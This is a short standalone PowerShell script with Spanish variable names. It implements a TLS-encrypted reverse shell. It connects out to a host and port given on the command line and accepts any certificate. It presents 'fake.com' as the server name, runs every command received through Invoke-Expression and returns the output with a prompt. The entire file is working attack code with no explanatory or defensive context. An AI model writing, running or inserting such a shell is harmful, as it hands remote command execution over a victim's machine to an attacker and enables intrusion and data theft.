$servidor = new-object System.Net.Sockets.TcpClient($args[0],$args[1]);
if($servidor -eq $null){exit 1}
$transferencia = $servidor.GetStream();
$SSL = New-Object System.Net.Security.SslStream($transferencia,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
$SSL.AuthenticateAsClient('fake.com', $null, "Tls12", $false);
$Escribir = new-object System.IO.StreamWriter($SSL);
$Bfr = new-object System.Byte[] 1024;
$Escribir = new-object System.IO.StreamWriter($SSL)
$Escribir.Write('PS ' + (pwd).Path + '> ')
$Escribir.flush()
while(($i = $SSL.Read($Bfr, 0, $Bfr.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bfr,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$SSL.Write($sendbyte,0,$sendbyte.Length);$SSL.Flush()}
$Escribir.close();$servidor.close();
